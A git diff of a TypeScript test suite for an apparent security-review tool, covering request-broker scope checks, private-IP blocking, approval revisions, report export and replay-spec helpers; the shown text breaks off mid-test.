@@ -1,8 +1,8 @@
 import assert from 'node:assert/strict'
-import { execFile, spawn } from 'node:child_process'
+import { execFile } from 'node:child_process'
 import { randomUUID } from 'node:crypto'
 import { once } from 'node:events'
-import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
+import { mkdtempSync, readFileSync, rmSync, statSync } from 'node:fs'
 import { createServer } from 'node:http'
 import type { IncomingMessage, ServerResponse } from 'node:http'
 import { tmpdir } from 'node:os'
@@ -10,28 +10,40 @@ import { join } from 'node:path'
 import { setTimeout as delay } from 'node:timers/promises'
 import { test } from 'node:test'
 import { promisify } from 'node:util'
-import { RequestBroker } from '../src/server/broker.ts'
-import { accessPolicySnapshot } from '../src/access-policy.ts'
-import { assessmentCheckIds, preparedObservation, responseCheckIds, workerHistory } from '../src/domain.ts'
-import { accessPolicyReviews } from '../src/server/access-policy-checks.ts'
-import { checkCoverage, readComparisons } from '../src/server/evidence-checks.ts'
-import { responseEvidence, responseReview } from '../src/server/response-checks.ts'
-import { restrictAccessVerification } from '../src/server/report-evidence.ts'
+import { declarativeReplaySpecSchema, containsDestructivePayload } from '../src/replay-spec.ts'
+import type { DeclarativeReplaySpec } from '../src/replay-spec.ts'
+import {
+  BrokerApprovalRequired,
+  BrokerCircuitOpen,
+  BrokerDenied,
+  RequestBroker,
+} from '../src/server/broker.ts'
+import type { Grant, PublicAddress } from '../src/server/broker.ts'
+import { CanaryBroker } from '../src/server/canary-broker.ts'
+import { ColdGraphCompactor } from '../src/server/compactor.ts'
+import { queryCves } from '../src/server/cve-broker.ts'
+import { privateModelProfiles, saveModelProfile } from '../src/server/model-settings.ts'
+import {
+  createProjectPersona,
+  listProjectPersonas,
+  personaSecrets,
+  resolveRunPersonas,
+} from '../src/server/persona-vault.ts'
+import { retestReplaySpec, verifyReplaySpec } from '../src/server/replay-verifier.ts'
 import { exportReportMarkdown } from '../src/server/report-export.ts'
-import { parseReviewPlan, standardChecks } from '../src/server/review-plan.ts'
-import { findings } from '../src/server/schema.ts'
-import { assessmentAssignments, Store } from '../src/server/store.ts'
+import { ScopedBrowser } from '../src/server/scoped-browser.ts'
+import { Store } from '../src/server/store.ts'
 import { LinuxWorkerBackend } from '../src/server/worker-backend.ts'
-import { accessPolicy } from './scenarios.ts'
 
 const exec = promisify(execFile)
 
-async function fixture(handler: (request: IncomingMessage, response: ServerResponse) => void, host = '127.0.0.1') {
+async function httpFixture(handler: (req: IncomingMessage, res: ServerResponse) => void, host = '127.0.0.1') {
   const server = createServer(handler).listen(0, host)
   await once(server, 'listening')
   const address = server.address()
   if (!address || typeof address === 'string') throw new Error('Fixture has no address.')
   return {
+    port: address.port,
     url: `http://${host}:${address.port}`,
     close() {
       server.closeAllConnections()
@@ -41,608 +53,1247 @@ async function fixture(handler: (request: IncomingMessage, response: ServerRespo
 }
 
 const northstar = 'https://northstar.example'
-const allowed = { origin: northstar, canRead: (origin: string) => origin === northstar, audit: () => {} }
-const publicAddress = { address: '93.184.216.34', family: 4 }
+const apiOrigin = 'https://api.northstar.example'
+const docsOrigin = 'https://docs.northstar.example'
+const publicAddr: PublicAddress = { address: '93.184.216.34', family: 4 }
 
-test('checks DNS destinations and redirect scope before dialing', async () => {
-  const attempted: string[] = []
-  const privateDestination = new RequestBroker({
-    resolve: async () => [publicAddress, { address: '127.0.0.1', family: 4 }],
-    transport: async url => { attempted.push(url.origin); throw new Error('Unexpected connection.') },
-  })
-  await assert.rejects(privateDestination.readPublicRoot(allowed, new AbortController().signal), /public addresses/)
-  assert.equal(attempted.length, 0)
-  const redirect = new RequestBroker({
-    resolve: async () => [publicAddress],
-    transport: async url => {
-      attempted.push(url.origin)
-      return { status: 302, headers: { location: 'https://docs.northstar.example/' } }
-    },
-  })
-  await assert.rejects(redirect.readPublicRoot(allowed, new AbortController().signal), /outside.*scope/)
-  assert.deepEqual(attempted, [northstar])
-})
-
-test('checks approved scope before reading a healthy fixture and before accepting its response', async () => {
-  let respond: (() => void) | undefined
-  const started = Promise.withResolvers<void>()
-  let count = 0
-  const target = await fixture((_request, response) => {
-    count += 1
-    respond = () => {
-      response.writeHead(200, { 'Content-Type': 'text/html', 'Strict-Transport-Security': 'max-age=31536000' }).end('Fixture page')
-    }
-    if (count > 1) started.resolve()
-    else respond()
-  })
-  try {
-    let approved = true
-    const grant = { ...allowed, canRead: (origin: string) => origin === northstar && approved }
-    const broker = new RequestBroker({
-      source: 'fixture response',
-      resolve: async () => [publicAddress],
-      transport: async (_url, _address, signal) => {
-        const response = await fetch(target.url, { signal, redirect: 'error' })
-        await response.body?.cancel()
-        return { status: response.status, headers: Object.fromEntries(response.headers) }
-      },
-    })
-    const signal = new AbortController().signal
-    const first = await broker.readPublicRoot(grant, signal)
-    assert.equal(first.transportMaxAge, 31_536_000)
-    const pending = broker.readPublicRoot(grant, signal)
-    const checked = assert.rejects(pending, /outside.*scope/)
-    await started.promise
-    approved = false
-    respond?.()
-    await checked
-    await assert.rejects(broker.readPublicRoot(grant, signal), /outside.*scope/)
-    assert.equal(count, 2)
-  } finally {
-    await target.close()
+function makeGrant(overrides: Partial<Grant> = {}): Grant {
+  return {
+    origin: northstar,
+    tier: 1,
+    maxRpsPerOrigin: 20,
+    canRead: origin => origin === northstar,
+    audit: () => {},
+    ...overrides,
   }
-})
-
-test('cancels an unresolved destination without dialing when DNS finishes', async () => {
-  const lookup = Promise.withResolvers<{ address: string; family: number }[]>()
-  const broker = new RequestBroker({
-    resolve: () => lookup.promise,
-    transport: async () => { throw new Error('Unexpected connection.') },
-  })
-  const controller = new AbortController()
-  const read = assert.rejects(broker.readPublicRoot(allowed, controller.signal), /scope changed/)
-  controller.abort(new Error('scope changed'))
-  await read
-  lookup.resolve([publicAddress])
-})
-
-test('links legacy candidates only to inventory that contains their origin', t => {
-  const directory = mkdtempSync(join(tmpdir(), 'guardian-candidate-sources-'))
-  t.after(() => rmSync(directory, { recursive: true, force: true }))
-  const storage = new Store(directory)
-  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'Northstar', seeds: [northstar] })
-  const { id: runId } = storage.createRun({ requestId: randomUUID(), projectId, goal: 'Review the supplied inventory.', sourceMode: 'prepared' })
-  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
-  const [original] = storage.run(runId).candidates
-  const { id: laterId } = storage.addProjectAsset({
-    requestId: randomUUID(), projectId, origin: 'https://docs.northstar.example',
-    source: 'Later operator record', thirdParty: false,
-  })
-  const later = storage.projectDetail(projectId).assets.find(asset => asset.id === laterId)
-  assert.ok(later)
-  const { sourceEvidenceId, ...legacy } = original
-  assert.ok(sourceEvidenceId)
-  storage.updateRun(runId, { candidates: [legacy, later] })
-
-  assert.deepEqual(storage.runDetail(runId).run.candidates.map(asset => asset.sourceEvidenceId), [sourceEvidenceId, undefined])
-  assert.deepEqual(storage.run(runId).candidates, [legacy, later])
-})
-
-test('shows the source and original timestamp of supplied response evidence', t => {
-  const directory = mkdtempSync(join(tmpdir(), 'guardian-supplied-response-'))
-  t.after(() => rmSync(directory, { recursive: true, force: true }))
-  const storage = new Store(directory)
-  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'Northstar', seeds: [northstar] })
-  const { id: runId } = storage.createRun({
-    requestId: randomUUID(), projectId, goal: 'Review the supplied response.', sourceMode: 'prepared',
-  })
-  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
-  const [asset] = storage.run(runId).candidates
-  storage.command({ requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: 0, assetIds: [asset.id], consent: true })
-  storage.commitReviewPlan(storage.run(runId), standardChecks())
-  const analysis = storage.workerList(runId).find(worker => worker.phase === 'analysis')
-  assert.ok(analysis)
-  const recordedAt = '2026-11-16T08:20:00Z'
-  const supplied = preparedObservation.parse({
-    status: 200, mediaType: 'text/html', transportMaxAge: 31_536_000, includeSubDomains: false, recordedAt,
-  })
-  assert.equal(preparedObservation.safeParse({ ...supplied, recordedAt: 'yesterday' }).success, false)
-  const observation = { ...supplied, origin: northstar, finalOrigin: northstar, source: 'supplied observation' as const }
-  assert.ok(!('recordedAt' in responseEvidence(observation, ['hsts'])))
-  const run = storage.run(runId)
-  const evidence = storage.addArtifact(run, analysis, 'observation', 'Observed public response', JSON.stringify({ observation }))
-  storage.updateWorker(analysis.id, { status: 'complete', outcome: 'Recorded a supplied response.' })
-  storage.writeReport(run, true)
-
-  const detail = storage.runDetail(runId)
-  assert.equal(detail.evidence.find(item => item.id === evidence.id)?.title, 'Supplied response metadata')
-  assert.equal(storage.artifact(runId, evidence.id).title, 'Supplied response metadata')
-  const markdown = exportReportMarkdown(storage, runId, detail.reports[0].id).content
-  assert.ok(markdown.includes('Supplied response metadata · ' + northstar))
-  assert.ok(markdown.includes('"recordedAt": "' + recordedAt + '"'))
-  assert.equal(storage.assignmentObservation(analysis.id)?.title, 'Observed public response')
-})
-
-test('keeps reports tied to current approval and requires fresh verification after reapproval', t => {
-  const directory = mkdtempSync(join(tmpdir(), 'guardian-approval-'))
-  t.after(() => rmSync(directory, { recursive: true, force: true }))
-  const storage = new Store(directory)
-  const docsOrigin = 'https://docs.northstar.example'
-  const { id: projectId } = storage.createProject({ requestId: randomUUID(), name: 'Northstar', seeds: [northstar, docsOrigin] })
-  const { id: runId } = storage.createRun({ requestId: randomUUID(), projectId, goal: 'Review <em>response metadata</em>.', sourceMode: 'public' })
-  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
-  const primary = storage.run(runId).candidates.find(asset => asset.origin === northstar)
-  const docs = storage.run(runId).candidates.find(asset => asset.origin === docsOrigin)
-  assert.ok(primary && docs)
-  const approve = (assetIds: string[], expectedScopeRevision = storage.run(runId).scopeRevision) =>
-    storage.command({ requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision, assetIds, consent: true })
-  approve([primary.id, docs.id])
-  storage.commitReviewPlan(storage.run(runId), standardChecks())
-
-  const analysis = storage.workerList(runId).find(worker => worker.assetId === primary.id && worker.phase === 'analysis')
-  const docsAnalysis = storage.workerList(runId).find(worker => worker.assetId === docs.id && worker.phase === 'analysis')
-  assert.ok(analysis && docsAnalysis)
-  const run = storage.updateRun(runId, { phase: 'verification' })
-  const response = {
-    origin: northstar, finalOrigin: northstar, status: 200, mediaType: 'text/html', transportMaxAge: null,
-    includeSubDomains: false, source: 'fixture response', extraField: 'private fixture annotation',
-  }
-  const observation = storage.addArtifact(run, analysis, 'observation', 'Synthetic response', JSON.stringify({ observation: response }))
-  const otherHost = storage.addArtifact(run, docsAnalysis, 'observation', 'Synthetic docs response',
-    JSON.stringify({ observation: { ...response, origin: docsOrigin, finalOrigin: docsOrigin } }))
-  storage.updateWorker(analysis.id, { status: 'complete', outcome: 'Recorded a response.' })
-  storage.event(runId, 'broker.allowed', 'Recorded a fixture redirect.', { assignmentId: analysis.id, origin: docsOrigin })
-  const verification = storage.makeWorker(run, 'verification', primary, 'Verify Northstar', 'Check the synthetic evidence.')
-  const proof = {
-    origin: northstar, checks: [{ id: 'hsts', status: 'gap' }],
-    comparisons: [{ id: 'hsts', observed: null, baseline: { minimum: 1 } }],
-    inputEvidence: [observation.id], interpreter: 'just-bash 3.6.1', exitStatus: 0,
-    stdout: 'private fixture annotation',
-  }
-  const evidence = storage.addArtifact(run, verification, 'verification', 'Fixture verification', JSON.stringify(proof))
-  assert.equal(storage.runDetail(runId).assignments.find(worker => worker.id === verification.id)?.inputAssignmentId, analysis.id)
-  assert.throws(() => storage.makeWorker(run, 'verification', docs, 'Invalid verification', 'Review the fixture.', analysis),
-    /Invalid worker input/)
-  storage.updateWorker(verification.id, {
-    status: 'complete', outcome: 'Confirmed from scope revision 1.',
-    checks: [{ ...responseReview(null)[0].coverage, status: 'gap',
-      observed: 'Header absent in the earlier capture.', reason: 'The response lacked HSTS.' }],
-  })
-  const findingId = randomUUID()
-  storage.db.insert(findings).values({
-    id: findingId, runId, assetId: primary.id, goalRevision: 0,
-    finding: { id: findingId, origin: northstar, title: 'Transport policy', status: 'confirmed', severity: 'low',
-      reason: 'Fixture response lacked HSTS.', remediation: 'Review the policy.', evidenceIds: [observation.id, evidence.id], scopeRevision: 1 },
-  }).run()
-  storage.writeReport(storage.run(runId), true)
-  const original = storage.runDetail(runId).reports[0]
-  assert.deepEqual(original.body.coverage.find(item => item.origin === northstar)?.checks?.map(check => check.status), ['gap'])
-  assert.deepEqual(original.body.coverage.find(item => item.origin === docsOrigin)?.checks?.map(check => check.status),
-    responseCheckIds.map(() => 'untested'))
-  const exportOriginal = () => exportReportMarkdown(storage, runId, original.id).content
-  const originalMarkdown = exportOriginal()
-  assert.match(originalMarkdown, /Review &lt;em&gt;response metadata&lt;\/em&gt;/)
-  assert.ok(originalMarkdown.includes(observation.id) && originalMarkdown.includes(evidence.id))
-  assert.ok(!originalMarkdown.includes('private fixture annotation'))
-  assert.ok(!originalMarkdown.includes(otherHost.id))
-
-  approve([primary.id])
-  assert.throws(() => approve([primary.id, docs.id], 1), /Scope changed since you opened this review/)
-  assert.deepEqual(storage.run(runId).approved, [primary.id])
-  assert.equal(storage.run(runId).scopeRevision, 2)
-  assert.equal(workerHistory(storage.run(runId), storage.workerList(runId)).get(docsAnalysis.id), 'Host removed from scope')
-  storage.writeReport(storage.run(runId), true)
-  const restricted = storage.runDetail(runId).reports[0]
-  assert.equal(restricted.body.findings.length, 0)
-  assert.match(restricted.body.coverage[0].status, /redirect chain is no longer approved/)
-  assert.deepEqual(restricted.body.coverage[0].checks?.map(({ id, status, observed }) => ({ id, status, observed })), [
-    { id: 'hsts', status: 'inconclusive', observed: null },
-    ...responseCheckIds.slice(1).map(id => ({ id, status: 'untested' as const, observed: null })),
-  ])
-  const restrictedMarkdown = exportReportMarkdown(storage, runId, restricted.id).content
-  assert.doesNotMatch(restrictedMarkdown, /## Fix first/)
-  assert.match(restrictedMarkdown, new RegExp(`1 check inconclusive · ${responseCheckIds.length - 1} checks untested`))
-  assert.match(restrictedMarkdown, /\*\*HSTS policy\*\* · Inconclusive/)
-  assert.match(restrictedMarkdown, /\*\*MIME sniffing protection\*\* · Untested/)
-  for (const removed of [docsOrigin, observation.id, evidence.id, 'Header absent in the earlier capture.']) {
-    assert.ok(!restrictedMarkdown.includes(removed))
-  }
-  assert.equal(exportOriginal(), originalMarkdown)
-
-  approve([docs.id])
-  approve([primary.id, docs.id])
-  const current = assessmentAssignments(storage.workerList(runId), primary.id, 0)
-  assert.equal(current.analysis?.scopeRevision, 4)
-  assert.equal(current.verification, undefined)
-  assert.equal(storage.runDetail(runId).assignments.find(worker => worker.id === verification.id)?.inputAssignmentId, analysis.id)
-  const earlierWork = workerHistory(storage.run(runId), storage.workerList(runId))
-  assert.equal(earlierWork.get(analysis.id), 'Earlier scope approval · Revision 1')
-  assert.equal(earlierWork.get(verification.id), 'Earlier scope approval · Revision 1')
-  assert.ok(current.analysis && !earlierWork.has(current.analysis.id))
-  storage.command({ requestId: randomUUID(), runId, action: 'stop' })
-  storage.command({ requestId: randomUUID(), runId, action: 'message', message: 'Which assignments are complete?' })
-  assert.match(storage.runDetail(runId).messages.at(-1)?.content ?? '', /1 assignment is complete\./)
-  const history = storage.runDetail(runId).reports
-  const latest = history[0].body
-  assert.equal(latest.findings.length, 0)
-  const pending = latest.coverage.find(item => item.origin === northstar)
-  assert.equal(pending?.status, 'Pending review')
-  assert.equal(pending?.evidenceId, null)
-  assert.deepEqual(pending?.checks?.map(check => check.status), responseCheckIds.map(() => 'untested'))
-  assert.equal(history.at(-1)?.body.findings[0].id, findingId)
-  assert.equal(exportOriginal(), originalMarkdown)
-
-  const { id: otherRunId } = storage.createRun({ requestId: randomUUID(), projectId, goal: 'Independent run.', sourceMode: 'public' })
-  assert.throws(() => exportReportMarkdown(storage, otherRunId, original.id), /Report version not found/)
-  storage.command({ requestId: randomUUID(), runId: otherRunId, action: 'discover', consent: true })
-  storage.command({ requestId: randomUUID(), runId: otherRunId, action: 'stop' })
-  const pendingApproval = {
-    requestId: randomUUID(), runId: otherRunId, action: 'scope' as const, expectedScopeRevision: 0,
-    assetIds: [primary.id], consent: true as const,
-  }
-  assert.throws(() => storage.command(pendingApproval), /Scope changes are unavailable in this phase/)
-  assert.equal(storage.run(otherRunId).status, 'stopped')
-  storage.command({ requestId: randomUUID(), runId: otherRunId, action: 'resume' })
-  storage.command(pendingApproval)
-  assert.equal(storage.run(otherRunId).scopeRevision, 1)
-  writeFileSync(join(directory, 'artifacts', evidence.id + '.txt'), JSON.stringify({ ...proof, inputEvidence: [otherHost.id] }))
-  assert.equal(storage.runDetail(runId).assignments.find(worker => worker.id === verification.id)?.inputAssignmentId, null)
-  const unavailable = exportOriginal()
-  assert.match(unavailable, /Supporting record unavailable for this report version/)
-  assert.ok(!unavailable.includes(otherHost.id))
-  assert.ok(!unavailable.includes(evidence.id))
-})
-
-test('keeps cross-origin redirects inconclusive for the requested host', async () => {
-  const finalOrigin = 'https://docs.northstar.example'
-  const broker = new RequestBroker({
-    resolve: async () => [publicAddress],
-    transport: async url => url.origin === northstar
-      ? { status: 308, headers: { location: finalOrigin + '/' } }
-      : { status: 200, headers: { 'strict-transport-security': 'max-age=31536000' } },
-  })
-  const signal = AbortSignal.timeout(5_000)
-  const observation = await broker.readPublicRoot({ ...allowed, canRead: origin => [northstar, finalOrigin].includes(origin) }, signal)
-  const reviews = responseReview(observation)
-  assert.equal(reviews.length, responseCheckIds.length)
-  for (const review of reviews) {
-    assert.equal(review.comparison, undefined)
-    assert.equal(review.coverage.status, 'inconclusive')
-    assert.equal(review.coverage.observed, null)
-    assert.match(review.coverage.reason, /final response came from docs\.northstar\.example/)
-  }
-})
-
-test('keeps older observations and ambiguous header values from confirming unsupported gaps', () => {
-  const oldObservation = {
-    origin: northstar, finalOrigin: northstar, status: 200, mediaType: 'text/html',
-    transportMaxAge: 31_536_000, includeSubDomains: false, source: 'supplied observation' as const,
-  }
-  const [hsts, mime, referrer] = responseReview(oldObservation)
-  assert.equal(checkCoverage(hsts, new Map([['hsts', 'met']])).status, 'met')
-  assert.equal(checkCoverage(hsts, new Map([['hsts', 'gap']])).status, 'inconclusive')
-  assert.equal(mime.coverage.status, 'inconclusive')
-  assert.equal(referrer.coverage.status, 'inconclusive')
-
-  const ambiguity = responseReview({ ...oldObservation, referrerPolicy: 'unrecognized' })
-  assert.equal(ambiguity[2].comparison, undefined)
-  const json = responseReview({ ...oldObservation, mediaType: 'application/json', referrerPolicy: 'unsafe-url' })
-  assert.equal(json[2].coverage.status, 'not-applicable')
-})
-
-test('accepts only supported check identifiers as a coordinator plan', () => {
-  assert.deepEqual(parseReviewPlan('{"checks":["referrer-policy","hsts","hsts"]}'), {
-    source: 'coordinator', checks: ['hsts', 'referrer-policy'],
-  })
-  assert.equal(parseReviewPlan('{"checks":["other-check"]}'), null)
-  assert.equal(parseReviewPlan('{"checks":["access-policy"]}'), null)
-  assert.deepEqual(parseReviewPlan('{"checks":["access-policy"]}', assessmentCheckIds), {
-    source: 'coordinator', checks: ['access-policy'],
-  })
-  assert.equal(parseReviewPlan('{"checks":[]}'), null)
-  assert.equal(parseReviewPlan('{"checks":["hsts"],"hosts":["unapproved.example"]}'), null)
-  assert.equal(parseReviewPlan('{"checks":["hsts"],"command":"unexpected operation"}'), null)
-})
-
-test('rejects a finished plan for a superseded approval before it queues assignments', t => {
-  const directory = mkdtempSync(join(tmpdir(), 'guardian-plan-approval-'))
-  t.after(() => rmSync(directory, { recursive: true, force: true }))
-  const storage = new Store(directory)
-  const { id: projectId } = storage.createProject({
-    requestId: randomUUID(), name: 'Northstar', seeds: [northstar, 'https://docs.northstar.example'],
-  })
-  const { id: runId } = storage.createRun({
-    requestId: randomUUID(), projectId, goal: 'Review the approved response records.', sourceMode: 'prepared',
-  })
-  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
-  const ids = storage.run(runId).candidates.map(asset => asset.id)
-  const approve = (assetIds: string[]) => storage.command({
-    requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: storage.run(runId).scopeRevision, assetIds, consent: true,
-  })
-  approve(ids)
-  const earlier = storage.run(runId)
-  approve(ids.slice(1))
-
-  storage.commitReviewPlan(earlier, standardChecks())
-  assert.equal(storage.run(runId).reviewPlan?.status, 'pending')
-  assert.deepEqual(storage.workerList(runId).map(worker => worker.phase), ['discovery'])
-
-  storage.commitReviewPlan(storage.run(runId), standardChecks())
-  assert.equal(storage.run(runId).reviewPlan?.status, 'ready')
-  const reviews = storage.workerList(runId).filter(worker => worker.phase === 'analysis')
-  assert.deepEqual(reviews.map(worker => [worker.assetId, worker.scopeRevision]), [[ids[1], 2]])
-})
-
-test('keeps completed assignments when an expanded approval selects the same checks', t => {
-  const directory = mkdtempSync(join(tmpdir(), 'guardian-expanded-plan-'))
-  t.after(() => rmSync(directory, { recursive: true, force: true }))
-  const storage = new Store(directory)
-  const docs = 'https://docs.northstar.example'
-  const { id: projectId } = storage.createProject({
-    requestId: randomUUID(), name: 'Northstar', seeds: [northstar, docs],
-  })
-  storage.importProjectAccessPolicy({
-    requestId: randomUUID(), projectId, snapshot: { ...accessPolicy, origin: docs },
-  })
-  const { id: runId } = storage.createRun({
-    requestId: randomUUID(), projectId, goal: 'Review response settings.', sourceMode: 'public',
-  })
-  storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
-  const ids = storage.run(runId).candidates.map(asset => asset.id)
-  const primary = storage.run(runId).candidates.find(asset => asset.origin === northstar)!
-  const approve = (assetIds: string[], expectedScopeRevision: number) => storage.command({
-    requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision, assetIds, consent: true,
-  })
-  approve([primary.id], 0)
-  const selection = standardChecks()
-  storage.commitReviewPlan(storage.run(runId), selection)
-  const original = storage.workerList(runId).find(worker => worker.phase === 'analysis')!
-  storage.updateWorker(original.id, { status: 'complete' })
-
-  approve(ids, 1)
-  const pending = storage.run(runId).reviewPlan
-  assert.equal(pending?.status, 'pending')
-  assert.deepEqual(pending?.status === 'pending' && pending.previous, selection)
-  assert.deepEqual(storage.workerList(runId).filter(worker => worker.phase === 'analysis').map(worker => worker.id), [original.id])
-  storage.command({ requestId: randomUUID(), runId, action: 'stop' })
-  const partial = storage.runDetail(runId).reports[0]
-  assert.deepEqual(partial.body.selectedChecks, selection)
-  assert.ok(partial.body.gaps.includes('A revised check plan was pending for this approval.'))
-  storage.command({ requestId: randomUUID(), runId, action: 'resume' })
-  storage.commitReviewPlan(storage.run(runId), selection)
-  const attempts = storage.workerList(runId).filter(worker => worker.phase === 'analysis')
-  assert.equal(attempts.length, 2)
-  assert.deepEqual(attempts.filter(worker => worker.assetId === primary.id).map(worker => [worker.id, worker.status]),
-    [[original.id, 'complete']])
-  assert.equal(attempts.find(worker => worker.assetId !== primary.id)?.scopeRevision, 2)
-})
-
-for (const revoked of [false, true]) {
-  test(revoked ? 'rejects a saved response after an intervening redirect revocation'
-    : 'keeps a reused response subject to every recorded redirect approval', t => {
-    const directory = mkdtempSync(join(tmpdir(), 'guardian-reused-response-'))
-    t.after(() => rmSync(directory, { recursive: true, force: true }))
-    const storage = new Store(directory)
-    const relay = 'https://relay.northstar.example'
-    const records = 'https://records.northstar.example'
-    const { id: projectId } = storage.createProject({
-      requestId: randomUUID(), name: 'Northstar', seeds: [northstar, relay, records],
-    })
-    storage.importProjectAccessPolicy({
-      requestId: randomUUID(), projectId, snapshot: { ...accessPolicy, origin: records },
-    })
-    const { id: runId } = storage.createRun({
-      requestId: randomUUID(), projectId, goal: 'Review the approved records.', sourceMode: 'public',
-    })
-    storage.command({ requestId: randomUUID(), runId, action: 'discover', consent: true })
-    const candidates = new Map(storage.run(runId).candidates.map(asset => [asset.origin, asset.id]))
-    const approve = (...origins: string[]) => storage.command({
-      requestId: randomUUID(), runId, action: 'scope', expectedScopeRevision: storage.run(runId).scopeRevision,
-      assetIds: origins.map(origin => candidates.get(origin)!), consent: true,
-    })
-    approve(northstar, relay)
-    const first = storage.run(runId)
-    storage.commitReviewPlan(first, standardChecks())
-    const worker = storage.workerList(runId).find(worker => worker.assetId === candidates.get(northstar))!
-    for (const origin of [northstar, relay]) {
-      storage.event(runId, 'broker.allowed', 'Read a fixture response.', { assignmentId: worker.id, origin })
-    }
-    storage.addArtifact(first, worker, 'observation', 'Observed public response', JSON.stringify({
-      observation: {
-        origin: northstar, finalOrigin: northstar, status: 200, mediaType: 'text/html',
-        transportMaxAge: null, includeSubDomains: false, source: 'fixture response',
-      },
-    }), 'capture:1')
-    storage.updateWorker(worker.id, { status: 'complete' })
-    if (revoked) approve(northstar)
-    approve(northstar, relay, records)
-    const expanded = storage.run(runId)
-    assert.equal(expanded.reviewPlan?.status, 'pending')
-    storage.commitReviewPlan(expanded, standardChecks(assessmentCheckIds))
-    const current = assessmentAssignments(storage.workerList(runId), candidates.get(northstar)!, 0).analysis!
-    assert.notEqual(current.id, worker.id)
-    const capture = storage.assignmentObservation(current.id)
-    if (revoked) {
-      assert.equal(capture, undefined)
-    } else {
-      assert.ok(capture)
-      assert.deepEqual(storage.brokerOrigins(current).sort(), [northstar, relay].sort())
-      storage.updateWorker(current.id, { status: 'complete' })
-      approve(northstar, records)
-      storage.command({ requestId: randomUUID(), runId, action: 'stop' })
-      const report = storage.runDetail(runId).reports[0]
-      const coverage = report.body.coverage.find(row => row.origin === northstar)
-      assert.equal(coverage?.evidenceId, null)
-      assert.match(coverage?.status ?? '', /redirect chain is no longer approved/)
-      assert.ok(!exportReportMarkdown(storage, runId, report.id).content.includes(capture.id))
-    }
-  })
 }
 
-test('requires unique policy cases and leaves missing access decisions inconclusive', () => {
-  const invalid = { ...accessPolicy, observed: [...accessPolicy.observed, accessPolicy.observed[0]] }
-  assert.equal(accessPolicySnapshot.safeParse(invalid).success, false)
-  assert.equal(accessPolicySnapshot.safeParse({
-    ...accessPolicy, observed: [{ caseId: 'unmatched', decision: 'allow' }],
-  }).success, false)
-  assert.equal(accessPolicySnapshot.safeParse({
-    ...accessPolicy,
-    expected: [{ ...accessPolicy.expected[0], decision: 'allow', impactIfAllowed: 'organization-admin' }],
-  }).success, false)
-  const observedWithImpact = accessPolicySnapshot.parse({
-    ...accessPolicy, observed: [{ ...accessPolicy.observed[0], impactIfAllowed: 'organization-admin' }],
-  })
-  assert.equal('impactIfAllowed' in observedWithImpact.observed[0], false)
-  assert.equal(accessPolicyReviews(observedWithImpact)[0].rule.severity, 'medium')
-  const reviews = accessPolicyReviews(accessPolicySnapshot.parse(accessPolicy))
-  const comparisons = reviews.flatMap(review => review.comparison ? [review.comparison] : [])
-  const unexpected = readComparisons('[{"id":"unmatched","outcome":"gap"}]', comparisons)
-  assert.equal(unexpected.size, 0)
-  assert.equal(checkCoverage(reviews[0], unexpected).status, 'inconclusive')
-  assert.equal(checkCoverage(reviews[3], unexpected).status, 'inconclusive')
-  assert.equal(reviews[3].comparison, undefined)
-})
-
-test('retains only access verdicts supported by the saved snapshot and comparison', () => {
-  const source = { id: randomUUID(), content: JSON.stringify({ origin: northstar, snapshot: accessPolicy }) }
-  const reviews = accessPolicyReviews(accessPolicy)
-  const receipt = {
-    origin: northstar, inputEvidence: [randomUUID(), source.id], exitStatus: 0,
-    checks: reviews.map(({ coverage }) => ({ ...coverage, status: 'gap' })),
-    comparisons: reviews.flatMap(({ comparison }) => comparison ? [{
-      ...comparison, observed: comparison.id === 'access-policy:audit-summary' ? 'allow' : comparison.observed,
-    }] : []),
+function replayBaseFields(origin = northstar) {
+  return {
+    version: 1 as const,
+    origin,
+    title: 'Deterministic Replay Verification Check',
+    category: 'broken-access-control' as const,
+    cwe: 'CWE-287',
+    severity: 'high' as const,
+    severityRationale: 'Direct proof of unauthorized access or execution.',
+    impact: 'An unauthenticated caller can access protected state.',
+    remediation: 'Enforce strict server-side authorization checks.',
+    recheckInstructions: 'Re-run the declarative replay spec after deploying the patch.',
   }
-  const content = JSON.stringify(receipt)
-  assert.equal(restrictAccessVerification(content, { ...source, id: randomUUID() }, northstar), undefined)
-  const wrongHost = { ...source, content: JSON.stringify({
-    origin: northstar, snapshot: { ...accessPolicy, origin: 'https://docs.northstar.example' },
-  }) }
-  assert.equal(restrictAccessVerification(content, wrongHost, northstar), undefined)
-  const retained = restrictAccessVerification(content, source, northstar)
-  assert.deepEqual(retained?.receipt.inputEvidence, [source.id])
-  assert.deepEqual(retained?.receipt.checks.map(({ caseId, status }) => [caseId, status]), [
-    ['billing-export', 'gap'], ['audit-summary', 'inconclusive'], ['read-summary', 'inconclusive'], ['modify-schedule', 'inconclusive'],
-  ])
-  const failed = restrictAccessVerification(JSON.stringify({ ...receipt, exitStatus: 1 }), source, northstar)
-  assert.ok(failed?.receipt.checks.every(check => check.status === 'inconclusive'))
+}
+
+// ============================================================================
+// 1. DNS Rebinding, Private-IP Blocking, 8-Hop Redirects & local-lab Opt-In
+// ============================================================================
+
+test('enforces DNS public-IP check, 8-hop redirect scope, abort-before-dial, and local-lab opt-in gate', async () => {
+  const attempted: string[] = []
+  const privateBroker = new RequestBroker({
+    resolve: async () => [publicAddr, { address: '127.0.0.1', family: 4 }],
+    transport: async url => { attempted.push(url.origin); throw new Error('Should not dial private IP') },
+  })
+  await assert.rejects(
+    privateBroker.executeHttp({ origin: northstar, method: 'GET', pathAndQuery: '/' }, makeGrant(), AbortSignal.timeout(5_000)),
+    /public addresses/,
+  )
+  assert.equal(attempted.length, 0)
+
+  // local-lab requires BOTH grant.allowLocalLab=true AND GUARDIAN_ALLOW_LOCAL_LAB=1
+  const prevEnv = process.env.GUARDIAN_ALLOW_LOCAL_LAB
+  try {
+    delete process.env.GUARDIAN_ALLOW_LOCAL_LAB
+    await assert.rejects(
